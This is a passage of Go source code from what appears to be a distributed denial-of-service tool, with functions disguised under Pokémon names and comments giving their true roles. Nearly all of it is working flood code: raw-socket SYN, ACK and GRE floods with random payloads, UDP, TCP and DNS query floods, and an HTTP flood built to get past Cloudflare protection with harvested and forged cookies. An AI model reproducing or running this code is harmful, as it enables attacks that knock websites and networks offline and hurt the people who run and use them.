				if len(via) >= 10 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		},
	}
}

func zoroark() (http.CookieJar, error) {
	return &mimikyu{cookies: make(map[string][]*http.Cookie)}, nil
}

type mimikyu struct {
	mu      sync.Mutex
	cookies map[string][]*http.Cookie
}

func (j *mimikyu) SetCookies(u *url.URL, cookies []*http.Cookie) {
	j.mu.Lock()
	defer j.mu.Unlock()
	j.cookies[u.Host] = append(j.cookies[u.Host], cookies...)
}

func (j *mimikyu) Cookies(u *url.URL) []*http.Cookie {
	j.mu.Lock()
	defer j.mu.Unlock()
	return j.cookies[u.Host]
}

func (s *ditto) gastly(targetURL string) error {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", s.userAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	s.cookies = resp.Cookies()
	if resp.StatusCode == 503 || resp.StatusCode == 403 {
		time.Sleep(5 * time.Second)
		req2, _ := http.NewRequest("GET", targetURL, nil)
		req2.Header.Set("User-Agent", s.userAgent)
		for _, c := range s.cookies {
			req2.AddCookie(c)
		}
		resp2, err := s.client.Do(req2)
		if err != nil {
			return err
		}
		defer resp2.Body.Close()
		s.cookies = resp2.Cookies()
	}
	return nil
}

// performCFBypass => gyarados
func gyarados(target string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var requestCount int64
	var bypassCount int64
	var wg sync.WaitGroup
	hostname := target
	hostname = strings.TrimPrefix(hostname, "https://")
	hostname = strings.TrimPrefix(hostname, "http://")
	if idx := strings.Index(hostname, "/"); idx != -1 {
		hostname = hostname[:idx]
	}
	scheme := "https"
	if targetPort == 80 {
		scheme = "http"
	}
	targetURL := fmt.Sprintf("%s://%s:%d/", scheme, hostname, targetPort)
	paths := []string{"/", "/index.php", "/wp-login.php", "/admin", "/api/v1/", "/search?q=" + turla(8), "/cdn-cgi/trace"}
	sessionWorkers := 50
	if cozyBear < sessionWorkers {
		sessionWorkers = cozyBear
	}
	for i := 0; i < sessionWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			session := zorua()
			if session.gastly(targetURL) == nil {
				atomic.AddInt64(&bypassCount, 1)
			}
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					path := paths[rand.Intn(len(paths))]
					reqURL := fmt.Sprintf("%s://%s:%d%s", scheme, hostname, targetPort, path)
					req, err := http.NewRequest("GET", reqURL, nil)
					if err != nil {
						continue
					}
					req.Header.Set("User-Agent", session.userAgent)
					req.Header.Set("Accept", "text/html,application/xhtml+xml")
					req.Header.Set("Connection", "keep-alive")
					for _, c := range session.cookies {
						req.AddCookie(c)
					}
					req.AddCookie(&http.Cookie{Name: "__cf_bm", Value: turla(32)})
					resp, err := session.client.Do(req)
					if err != nil {
						continue
					}
					if len(resp.Cookies()) > 0 {
						session.cookies = append(session.cookies, resp.Cookies()...)
					}
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddInt64(&requestCount, 1)
					if resp.StatusCode == 503 || resp.StatusCode == 403 {
						time.Sleep(time.Duration(rand.Intn(3)+2) * time.Second)
						session.gastly(targetURL)
					}
				}
			}
		}()
	}
	wg.Wait()
}

// performSYNFlood => dragonite
func dragonite(targetIP string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	var packetCount int64
	var wg sync.WaitGroup
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					tcpLayer := &layers.TCP{SrcPort: layers.TCPPort(rand.Intn(52024) + 1024), DstPort: layers.TCPPort(targetPort), Seq: rand.Uint32(), Window: 12800, SYN: true, DataOffset: 5}
					payload := make([]byte, 65535-40)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload))
					conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

// performACKFlood => tyranitar
func tyranitar(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return err
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return fmt.Errorf("invalid IP")
	}
	var packetCount int64
	var wg sync.WaitGroup
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					tcpLayer := &layers.TCP{SrcPort: layers.TCPPort(rand.Intn(64312) + 1024), DstPort: layers.TCPPort(targetPort), ACK: true, Seq: rand.Uint32(), Ack: rand.Uint32(), Window: 12800, DataOffset: 5}
					payload := make([]byte, 65535-40)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload))
					conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	return nil
}

// performGREFlood => metagross
func metagross(targetIP string, duration int) error {
	rand.Seed(time.Now().UnixNano())
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return err
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return fmt.Errorf("invalid IP")
	}
	var packetCount int64
	var wg sync.WaitGroup
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					greLayer := &layers.GRE{}
					payload := make([]byte, 65535-24)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, greLayer, gopacket.Payload(payload))
					conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	return nil
}

// performDNSFlood => salamence
func salamence(targetIP string, targetPort, duration int) {
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var packetCount int64
	var wg sync.WaitGroup
	domains := []string{"youtube.com", "google.com", "spotify.com", "netflix.com", "bing.com", "facebook.com", "amazon.com"}
	queryTypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					domain := domains[rand.Intn(len(domains))]
					queryType := queryTypes[rand.Intn(len(queryTypes))]
					dnsQuery := garchomp(domain, queryType)
					buffer, _ := dnsQuery.Pack()
					conn.WriteTo(buffer, &net.UDPAddr{IP: dstIP, Port: targetPort})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

// constructDNSQuery => garchomp
func garchomp(domain string, queryType uint16) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(domain), queryType)
	edns0 := new(dns.OPT)
	edns0.Hdr.Name = "."
	edns0.Hdr.Rrtype = dns.TypeOPT
	edns0.SetUDPSize(4096)
	msg.Extra = append(msg.Extra, edns0)
	return msg
}

// performUDPFlood => snorlax
func snorlax(targetIP string, targetPort, duration int) {
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	payload := make([]byte, 1024)
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", dstIP, targetPort))
					if err != nil {
						continue
					}
					conn.Write(payload)
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}

// TCPfloodAttack => gengar
func gengar(targetIP string, targetPort, duration int) {
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", dstIP, targetPort))
					if err != nil {
						continue
					}
					conn.Write([]byte("GET / HTTP/1.1\r\n\r\n"))
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}
